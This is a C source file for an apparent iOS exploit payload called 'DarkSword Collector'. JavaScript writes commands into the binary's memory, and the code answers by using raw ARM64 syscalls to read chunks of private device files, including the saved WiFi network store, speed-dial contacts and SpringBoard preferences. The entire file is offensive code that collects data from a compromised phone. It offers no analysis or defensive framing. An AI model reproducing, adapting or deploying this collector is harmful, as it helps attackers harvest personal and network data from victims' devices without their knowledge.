/**
 * DarkSword Collector v26 - Parameterized reads via command buffer
 * JS writes command to binary offset 0x100 (in __TEXT segment header area)
 * Collector reads command from its own memory at (base + 0x100)
 * Command: [file_id, offset_hi, offset_lo, count]
 * Returns: first 4 bytes read as int, or status code
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}
static long _svc4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory");
    return x0;
}

#define SYS_open   5
#define SYS_read   3
#define SYS_close  6
#define SYS_lseek  199

#define SEEK_SET 0

static const char *paths[] = {
    "/etc/hosts",
    "/var/mobile/Library/Preferences/.GlobalPreferences.plist",
    "/var/mobile/Library/WiFiNetworkStore/com.apple.wifi.networkstore.plist",
    "/var/mobile/Library/Preferences/com.apple.springboard.plist",
    "/var/mobile/Library/Preferences/com.apple.mobilephone.speeddial.plist",
    "/var/mobile/Library/Preferences/com.apple.preferences.sounds.plist"
};

int ds_start(void) {
    /* Get base address: ds_start is at offset 0x4000 in binary */
    long base = (long)ds_start - 0x4000L;
    volatile unsigned char *cmd = (volatile unsigned char*)(base + 0x100L);

    int file_id = cmd[0];
    int offset = (cmd[1] << 8) | cmd[2];

    /* Bounds check */
    int npaths = sizeof(paths) / sizeof(paths[0]);
    if (file_id >= npaths) return 0xBAD00000 | file_id;

    /* Open and seek to offset */
    int fd = (int)_svc2(SYS_open, (long)paths[file_id], 0);
    if (fd < 0) return 0xDEAD0000 | file_id;

    if (offset > 0) {
        _svc4(SYS_lseek, fd, (long)offset, SEEK_SET, 0);
    }

    /* Read 4 bytes */
    unsigned char buf[4] = {0};
    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
    _svc1(SYS_close, fd);

    if (n < 1) return 0xBEEF0000 | file_id;

    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
}
